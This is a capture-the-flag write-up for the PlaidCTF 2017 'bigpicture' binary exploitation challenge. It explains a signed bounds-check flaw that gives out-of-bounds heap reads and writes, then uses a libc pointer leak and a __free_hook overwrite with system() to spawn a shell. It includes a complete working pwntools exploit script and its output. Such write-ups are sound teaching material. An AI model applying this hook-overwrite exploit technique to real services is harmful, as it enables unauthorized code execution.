---
layout: post
comments: true
title: "PlaidCTF 2017 \"bigpicture\" write-up (pwn 200)"
description: "Write-up for binary exploitation challenge \"bigpicture\" @ PlaidCTF 2017"
---

Task description:

> Size matters!

We're presented with a x86_64 ELF binary, libc it's using and the source code.

```
$ nc bigpicture.chal.pwning.xxx 420 
Let's draw a picture!
How big?  1 x 1
> 0 , 0 , A 
> q
A
Bye!
```
<!-- more -->

The source:

```c
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>

int width, height;
char *buf;

void plot(int x, int y, char c);
void draw();

int main() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
	alarm(100);
	puts("Let's draw a picture!");
	fputs("How big? ", stdout);
	scanf(" %d x %d", &width, &height);
	buf = calloc(width, height);
	if(buf == NULL) {
		perror("malloc");
		return -1;
	}
	char c;
	while(1) {
		fputs("> ", stdout);
		int x, y;
		if(scanf(" %d , %d , %c", &x, &y, &c) != 3)
			break;
		plot(x, y, c);
	}
	if(scanf(" quit%c", &c) != 1)
		draw();
	puts("Bye!");
	free(buf);
	return 0;
}

char *get(size_t x, size_t y) {
	return &buf[x * height + y];
}

void plot(int x, int y, char c) {
	if(x >= width || y >= height) {
		puts("out of bounds!");
		return;
	}
	char *ptr = get(x, y);
	if(*ptr != 0)
		printf("overwriting %c!\n", *ptr);
	else
		*ptr = c;
}

void draw() {
	int x, y;
	char c;
	for(y = height-1; y >= 0; y--) {
		for(x = 0; x < width; x++) {
			c = *get(x, y);
			if(c == 0)
				c = ' ';
			if(putchar(c) != c)
				return;
		}
		putchar('\n');
	}
}

```



This is a plot drawing binary. You enter the matrix size and fill it up with characters. At the end the resulting matrix is printed back to you. The program allocates `width * height` bytes on the heap to store plot values.

The actual vulnerability is in the `plot` function:
```c
void plot(int x, int y, char c) {
	if(x >= width || y >= height) {
		puts("out of bounds!");
		return;
	}
	char *ptr = get(x, y);
	if(*ptr != 0)
		printf("overwriting %c!\n", *ptr);
	else
		*ptr = c;
}
```

Note, that both width and height variables are signed, but only upper bounds are checked. Specifying negative signed values allows us to read arbitrary non-zero values in the memory before heap or write arbirary values in case the target memory is zero. Unfortunately the binary's relocation section is write-protected and ASLR was on. There was no obvious way to affect the control flow of the program given the only memory before the heap was the .text and .data sections of the binary. This is the case when the amount of data allocated on the heap is less then `M_MMAP_THRESHOLD` value on the system. If the value is less the this constant then `brk()` system call is used to increase program break and heap is in fact allocated in the .data section of the binary. Quote from man:

> Note: Nowadays, glibc uses a dynamic mmap threshold by  default.
> The  initial value of the threshold is 128*1024

Luckily for us we can force `calloc()` to use `mmap()` to map new memory segment using the value equal to or greater than `128*1024`. This way we observe the heap being just below libc.so at a fixed offset:

```
  Start Addr           End Addr       Size     Offset   objfile
0x55c718337000     0x55c718338000     0x1000        0x0 bigpicture
0x55c718538000     0x55c718539000     0x1000     0x1000 bigpicture
0x55c718539000     0x55c71853a000     0x1000     0x2000 bigpicture
0x7f1d3d9b8000     0x7f1d3db76000   0x1be000        0x0 libc-2.19.so
0x7f1d3db76000     0x7f1d3dd75000   0x1ff000   0x1be000 libc-2.19.so
0x7f1d3dd75000     0x7f1d3dd79000     0x4000   0x1bd000 libc-2.19.so
0x7f1d3dd79000     0x7f1d3dd7b000     0x2000   0x1c1000 libc-2.19.so
0x7f1d3dd7b000     0x7f1d3dd80000     0x5000        0x0 
0x7f1d3dd80000     0x7f1d3dda3000    0x23000        0x0 ld-2.19.so
0x7f1d3df72000     0x7f1d3df96000    0x24000        0x0 <---- HEAP
0x7f1d3dfa0000     0x7f1d3dfa2000     0x2000        0x0 
0x7f1d3dfa2000     0x7f1d3dfa3000     0x1000    0x22000 ld-2.19.so
0x7f1d3dfa3000     0x7f1d3dfa4000     0x1000    0x23000 ld-2.19.so
0x7f1d3dfa4000     0x7f1d3dfa5000     0x1000        0x0 
0x7fff67f57000     0x7fff67f78000    0x21000        0x0 [stack]
0x7fff67fa3000     0x7fff67fa5000     0x2000        0x0 [vvar]
0x7fff67fa5000     0x7fff67fa7000     0x2000        0x0 [vdso]
```

We want to overwrite the `__free_hook` pointer at libc's data section with address of `system()`. It is used by the `free` function:

![__free_hook]({{ site.url }}/assets/plaidctf2017/free_hook1.png)

This hook is placed in the `.bss` section of libc at a fixed offset:

```
.bss:00000000003C57A8    public __free_hook ; weak
.bss:00000000003C57A8    ; __int64 (__fastcall *_free_hook)(_QWORD, _QWORD)
```

To figure out the absolute address of `system()` we need to leak the address of some location in libc. Again, we can use `.got` section of libc which contains pointer to `free()` funcion at a fixed address:

```
.got:00000000003C2F98    free_ptr    dq offset free    ; DATA XREF: j_free_r
```

Last thing we have to do is write `/bin/sh` string to the memory allocated on the heap as its reference will be passed to the `free` function, which is effectively replaced with `system()`.

## Exploit code

```python
from pwn import *
from time import sleep
from struct import unpack, pack
import sys
import re

#libc 2.23

offset_to_start_libc = -0x5c2010 
offset_system = 0x045390
offset_free = 0x083940
offset_ptr_free = 0x03C2F98
offset_free_hook = 0x3C57A8

pc = remote('bigpicture.chal.pwning.xxx', 420)
pc.sendline(' 131072 x 1\n')  # 128 * 1024
pc.recv()

pointer_buf = ''

for i in range(-8, -2):
	off = offset_to_start_libc + offset_ptr_free + 8
	pc.sendline(' {} , {} , A\n'.format(off, i))
	sleep(0.5)
	res = pc.recv()
	byte =  re.search("overwriting (.{1})!", res).group(1)
	pointer_buf += byte

offset_abs_free = unpack("<Q", pointer_buf + '\x00\x00')[0]

print 'Free address:', hex(offset_abs_free) 

offset_abs_system = offset_abs_free - (offset_free - offset_system)

print 'System address:', hex(offset_abs_system)
print 'Overwriting __free_hook ptr with system address'

for k, i in enumerate(range(-8,-2)):
	byte_to_send = pack("<Q", offset_abs_system)[k]
	off = offset_to_start_libc + offset_free_hook + 8
	pc.sendline(' {} , {} , {}\n'.format(off , i, byte_to_send))	
	sleep(0.5)

print 'Writing "/bin/sh" to heap'

for k, i in enumerate(range(-8, 0)):
	byte_to_send = '/bin/sh\x00'[k]
	pc.sendline(' {} , {} , {}\n'.format(8 , i, byte_to_send))	
	sleep(0.5)

pc.sendline(' q')
pc.interactive()
```

```
# python sploit.py
[+] Opening connection to bigpicture.chal.pwning.xxx on port 420: Done
Free address: 0x7f973313d940
System address: 0x7f97330ff390
Overwriting __free_hook ptr with system address
Writing "/bin/sh" to heap
[*] Switching to interactive mode
$ cat /home/bigpicture/flag
PCTF{draw_me_like_one_of_your_pwn200s}
```